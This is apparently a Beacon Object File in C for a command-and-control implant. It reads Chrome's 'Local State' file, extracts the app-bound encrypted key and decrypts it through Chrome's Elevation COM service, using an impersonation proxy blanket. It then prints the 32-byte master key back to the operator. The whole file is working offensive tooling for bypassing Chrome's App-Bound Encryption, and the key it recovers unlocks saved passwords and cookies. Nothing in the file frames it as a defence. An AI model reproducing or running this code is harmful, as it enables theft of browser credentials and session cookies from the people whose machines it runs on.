#include <windows.h>
#include "beacon.h"

#ifndef CRYPT_STRING_BASE64
#define CRYPT_STRING_BASE64 0x00000001
#endif

// RPC authentication flags for CoSetProxyBlanket
#define RPC_C_AUTHN_DEFAULT            ((DWORD)-1)
#define RPC_C_AUTHZ_DEFAULT            ((DWORD)-1)
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY  6
#define RPC_C_IMP_LEVEL_IMPERSONATE    3
#define EOAC_DYNAMIC_CLOAKING          0x40

// Forward declaration of the Elevation COM interface with correct v-table layout
typedef struct IOriginalBaseElevator IOriginalBaseElevator;
typedef struct IOriginalBaseElevatorVtbl {
    BEGIN_INTERFACE
        // IUnknown
        HRESULT(STDMETHODCALLTYPE* QueryInterface)(IOriginalBaseElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IOriginalBaseElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IOriginalBaseElevator* This);

    // IElevator methods
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IOriginalBaseElevator* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD caller_proc_id,
        ULONG_PTR* proc_handle
        );
    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IOriginalBaseElevator* This,
        DWORD protection_level,
        BSTR plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );
    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IOriginalBaseElevator* This,
        BSTR ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );
    END_INTERFACE
} IOriginalBaseElevatorVtbl;
struct IOriginalBaseElevator {
    CONST_VTBL IOriginalBaseElevatorVtbl* lpVtbl;
};

// GUIDs
EXTERN_C const GUID IID_IOriginalBaseElevator =
{ 0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8} };
EXTERN_C const GUID CLSID_ChromeDecrypt =
{ 0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B} };

// Dynamic imports
extern "C" {
    // File I/O
    DECLSPEC_IMPORT DWORD  STDAPICALLTYPE KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
    DECLSPEC_IMPORT HANDLE STDAPICALLTYPE KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE);
    DECLSPEC_IMPORT DWORD  STDAPICALLTYPE KERNEL32$GetLastError(void);
    DECLSPEC_IMPORT DWORD  STDAPICALLTYPE KERNEL32$GetFileSize(HANDLE, LPDWORD);
    DECLSPEC_IMPORT BOOL   STDAPICALLTYPE KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    DECLSPEC_IMPORT BOOL   STDAPICALLTYPE KERNEL32$CloseHandle(HANDLE);

    // Memory & strings
    DECLSPEC_IMPORT void* STDAPICALLTYPE MSVCRT$malloc(size_t);
    DECLSPEC_IMPORT void   STDAPICALLTYPE MSVCRT$free(void*);
    DECLSPEC_IMPORT void* STDAPICALLTYPE MSVCRT$memcpy(void*, const void*, size_t);
    DECLSPEC_IMPORT char* STDAPICALLTYPE MSVCRT$strstr(const char*, const char*);
    DECLSPEC_IMPORT char* STDAPICALLTYPE MSVCRT$strchr(const char*, int);
    DECLSPEC_IMPORT size_t STDAPICALLTYPE MSVCRT$strlen(const char*);

    // Base64
    DECLSPEC_IMPORT BOOL   STDAPICALLTYPE CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

    // COM
    DECLSPEC_IMPORT HRESULT STDAPICALLTYPE OLE32$CoInitializeEx(LPVOID, DWORD);
    DECLSPEC_IMPORT void    STDAPICALLTYPE OLE32$CoUninitialize(void);
    DECLSPEC_IMPORT HRESULT STDAPICALLTYPE OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
    DECLSPEC_IMPORT HRESULT STDAPICALLTYPE OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, void*, DWORD);

    // BSTR
    DECLSPEC_IMPORT BSTR    STDAPICALLTYPE OLEAUT32$SysAllocStringByteLen(const char*, UINT);
    DECLSPEC_IMPORT UINT    STDAPICALLTYPE OLEAUT32$SysStringByteLen(BSTR);
    DECLSPEC_IMPORT void    STDAPICALLTYPE OLEAUT32$SysFreeString(BSTR);
}

// Merged BOF: extract AppBound blob and decrypt via Elevation COM
extern "C" void go(PCHAR args, int len) {
    UNREFERENCED_PARAMETER(args);
    UNREFERENCED_PARAMETER(len);

    // 1) Locate Local State
    char basePath[MAX_PATH];
    if (!KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", basePath, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetEnvironmentVariableA failed");
        return;
    }
    const char* suffix = "\\Google\\Chrome\\User Data\\Local State";
    size_t bLen = MSVCRT$strlen(basePath), sLen = MSVCRT$strlen(suffix);
    if (bLen + sLen + 1 > MAX_PATH) {
        BeaconPrintf(CALLBACK_ERROR, "[!] path too long");
        return;
    }
    CHAR path[MAX_PATH];
    MSVCRT$memcpy(path, basePath, bLen);
    MSVCRT$memcpy(path + bLen, suffix, sLen + 1);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Path: %s", path);

    // 2) Read file
    HANDLE h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileA err=%u", KERNEL32$GetLastError());
        return;
    }
    DWORD fSize = KERNEL32$GetFileSize(h, NULL);
    if (!fSize) { BeaconPrintf(CALLBACK_ERROR, "[!] file empty"); KERNEL32$CloseHandle(h); return; }
    BYTE* buf = (BYTE*)MSVCRT$malloc(fSize + 1);
    DWORD r;
    if (!KERNEL32$ReadFile(h, buf, fSize, &r, NULL) || r != fSize) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ReadFile failed"); MSVCRT$free(buf); KERNEL32$CloseHandle(h); return;
    }
    buf[fSize] = '\0';
    KERNEL32$CloseHandle(h);

    // 3) Extract Base64
    const char* marker = "\"app_bound_encrypted_key\":\"";
    char* start = MSVCRT$strstr((char*)buf, marker);
    if (!start) { BeaconPrintf(CALLBACK_ERROR, "[!] marker not found"); MSVCRT$free(buf); return; }
    start += MSVCRT$strlen(marker);
    char* end = MSVCRT$strchr(start, '"');
    if (!end) { BeaconPrintf(CALLBACK_ERROR, "[!] end quote"); MSVCRT$free(buf); return; }
    size_t b64Len = end - start;
    char* b64 = (char*)MSVCRT$malloc(b64Len + 1);
    MSVCRT$memcpy(b64, start, b64Len);
    b64[b64Len] = '\0';
    BeaconPrintf(CALLBACK_OUTPUT, "[B64] %s", b64);
    MSVCRT$free(buf);

    // 4) Base64 → raw
    DWORD rawLen = 0;
    if (!CRYPT32$CryptStringToBinaryA(b64, (DWORD)b64Len, CRYPT_STRING_BASE64, NULL, &rawLen, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] base64 size"); MSVCRT$free(b64); return;
    }
    BYTE* raw = (BYTE*)MSVCRT$malloc(rawLen);
    if (!CRYPT32$CryptStringToBinaryA(b64, (DWORD)b64Len, CRYPT_STRING_BASE64, raw, &rawLen, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] base64 decode"); MSVCRT$free(b64); MSVCRT$free(raw); return;
    }
    MSVCRT$free(b64);

    // 5) Strip APPB prefix
    if (rawLen <= 4) { BeaconPrintf(CALLBACK_ERROR, "[!] blob too short"); MSVCRT$free(raw); return; }
    BYTE* blob = raw + 4;
    DWORD blobLen = rawLen - 4;

    // 6) COM init & create
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] CoInitializeEx hr=0x%08x", hr);
    IUnknown* pUnk = NULL;
    hr = OLE32$CoCreateInstance(CLSID_ChromeDecrypt, NULL, CLSCTX_LOCAL_SERVER, IID_IOriginalBaseElevator, (LPVOID*)&pUnk);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] CoCreateInstance hr=0x%08x", hr);
    IOriginalBaseElevator* pElev = NULL;
    hr = pUnk->QueryInterface(IID_IOriginalBaseElevator, (void**)&pElev);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] QueryInterface hr=0x%08x", hr);

    // 7) Set proxy blanket
    hr = OLE32$CoSetProxyBlanket((IUnknown*)pElev, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] CoSetProxyBlanket hr=0x%08x", hr);

    // 8) Wrap BSTR and decrypt
    BSTR bstrIn = OLEAUT32$SysAllocStringByteLen((const char*)blob, blobLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] bstrInLen=%u", OLEAUT32$SysStringByteLen(bstrIn));
    BSTR bstrOut = NULL;
    DWORD lastErr = 0;
    hr = pElev->lpVtbl->DecryptData(pElev, bstrIn, &bstrOut, &lastErr);
    BeaconPrintf(CALLBACK_OUTPUT, "[COM] DecryptData hr=0x%08x, lastErr=%u", hr, lastErr);

    // 9) Print 32-byte key
    if (SUCCEEDED(hr) && bstrOut) {
        char hex[65] = { 0 };
        BYTE* key = (BYTE*)bstrOut;
        for (DWORD i = 0; i < 32; i++) {
            BYTE v = key[i]; BYTE hi = v >> 4, lo = v & 0xF;
            hex[i * 2] = (hi < 10 ? '0' + hi : 'a' + hi - 10);
            hex[i * 2 + 1] = (lo < 10 ? '0' + lo : 'a' + lo - 10);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[KEY32] %s", hex);
    }

    // Cleanup
    if (bstrOut) OLEAUT32$SysFreeString(bstrOut);
    if (bstrIn)  OLEAUT32$SysFreeString(bstrIn);
    if (pElev)   pElev->lpVtbl->Release(pElev);
    if (pUnk)    pUnk->Release();
    if (SUCCEEDED(hr)) OLE32$CoUninitialize();
    MSVCRT$free(raw);
}